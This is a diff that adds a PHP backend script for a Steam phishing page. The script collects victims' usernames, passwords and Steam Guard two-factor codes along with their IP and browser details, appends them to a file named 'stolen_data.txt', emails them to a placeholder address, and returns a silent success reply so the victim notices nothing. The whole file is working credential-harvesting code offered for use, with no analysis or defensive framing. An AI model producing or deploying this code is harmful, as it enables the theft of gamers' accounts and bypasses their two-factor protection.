@@ -1,0 +1,41 @@
+<?php
+// Получаем данные
+$data = json_decode(file_get_contents('php://input'), true);
+$ip = $_SERVER['REMOTE_ADDR'];
+$userAgent = $_SERVER['HTTP_USER_AGENT'];
+$time = date('Y-m-d H:i:s');
+
+// Формируем лог
+$log = "================================\n";
+$log .= "ВРЕМЯ: $time\n";
+$log .= "IP: $ip\n";
+$log .= "User-Agent: $userAgent\n";
+
+if (isset($data['type'])) {
+    switch ($data['type']) {
+        case 'steam_login':
+            $log .= "ТИП: Логин\n";
+            $log .= "USERNAME: " . ($data['username'] ?? 'N/A') . "\n";
+            $log .= "PASSWORD: " . ($data['password'] ?? 'N/A') . "\n";
+            break;
+            
+        case 'steam_guard':
+            $log .= "ТИП: Steam Guard\n";
+            $log .= "КОД: " . ($data['code'] ?? 'N/A') . "\n";
+            break;
+    }
+}
+
+// Сохраняем в файл
+file_put_contents('stolen_data.txt', $log, FILE_APPEND);
+
+// Отправляем себе на почту (опционально)
+$to = "your_email@gmail.com";
+$subject = "🎣 Новые данные Steam";
+$headers = "From: steam-alert@yourdomain.com\r\n";
+mail($to, $subject, $log, $headers);
+
+// Ничего не показываем пользователю
+header('Content-Type: application/json');
+echo json_encode(['success' => true]);
+?>
